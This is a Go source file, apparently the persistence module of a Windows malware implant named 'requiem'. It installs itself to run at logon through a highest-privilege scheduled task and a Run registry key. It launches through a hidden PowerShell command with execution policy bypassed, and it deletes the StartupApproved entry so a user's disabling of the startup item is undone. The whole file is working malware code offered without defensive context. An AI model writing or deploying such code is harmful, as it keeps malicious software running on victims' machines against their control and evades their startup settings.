package persistence

import (
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"requiem/store"
	"requiem/utils"
)

const (
	START_ALLOWED string = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run"
	AUTO_START    string = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
)

//go:embed schedular.xml
var schedularXML string

func Persist(filePath string) bool {
	persisted := 0

	if filePath == "" {
		filePath = store.ExecPath
	}

	// after a bunch of tests, i cant seem
	// to figure out how to use this for the
	// xml version
	command := fmt.Sprintf(
		"powershell -nop -w hidden -ep bypass -c \"& '%s' %s\"",
		filePath,
		store.LAUNCH_KEY,
	)

	if store.TASK_SCHEDULAR && store.IsAdmin {
		persisted += 1

		xml := strings.ReplaceAll(schedularXML, "%THE_CMD%", filePath)
		xml = strings.ReplaceAll(xml, "%THE_ARG%", store.LAUNCH_KEY)
		xml = strings.ReplaceAll(xml, "%THE_NAME%", store.PERSISTENCE_NAME)

		xmlPath := filepath.Join(os.TempDir(), fmt.Sprintf("%d.xml", time.Now().UnixNano()))

		err := os.WriteFile(xmlPath, []byte(xml), 0666)
		if err == nil {
			defer os.Remove(xmlPath)

			err := utils.RunCommand(
				"schtasks", "/create",
				"/tn", store.PERSISTENCE_NAME,
				"/xml", xmlPath,
				"/f",
			)

			if err != nil {
				utils.DebugLog(fmt.Sprintf("failed to persist with schedular (xml) - %s", err))
				persisted -= 1
			}
		} else {
			err := utils.RunCommand(
				"schtasks", "/create",
				"/tn", store.PERSISTENCE_NAME,
				"/tr", command,
				"/sc", "ONLOGON",
				"/rl", "HIGHEST",
				"/it", "/f",
			)

			if err != nil {
				utils.DebugLog(fmt.Sprintf("failed to persist with schedular (fallback) - %s", err))
				persisted -= 1
			}
		}
	}

	if store.AUTO_RUN_REG {
		persisted += 1

		err := utils.RunCommand(
			"reg", "delete",
			START_ALLOWED,
			"/v", store.PERSISTENCE_NAME,
			"/f",
		)

		// if err != nil {
		// 	utils.DebugLog(fmt.Sprintf("failed to enabled persistence with registry - %s", err))
		// 	persisted -= 1
		// }

		err = utils.RunCommand(
			"reg", "add",
			AUTO_START,
			"/v", store.PERSISTENCE_NAME,
			"/t", "REG_SZ",
			"/d", command,
			"/f",
		)

		if err != nil {
			utils.DebugLog(fmt.Sprintf("failed to persist with registry - %s", err))
			persisted -= 1
		}
	}

	return persisted == 0
}

func Unpersist() bool {
	persisted := 0

	if store.TASK_SCHEDULAR && store.IsAdmin {
		persisted += 1

		err := utils.RunCommand(
			"schtasks", "/delete",
			"/tn", store.PERSISTENCE_NAME,
			"/f",
		)

		if err != nil {
			persisted -= 1
		}
	}

	if store.AUTO_RUN_REG {
		persisted += 1

		err := utils.RunCommand(
			"reg", "delete",
			AUTO_START,
			"/v", store.PERSISTENCE_NAME,
			"/f",
		)

		if err != nil {
			persisted -= 1
		}
	}

	return persisted == 0
}
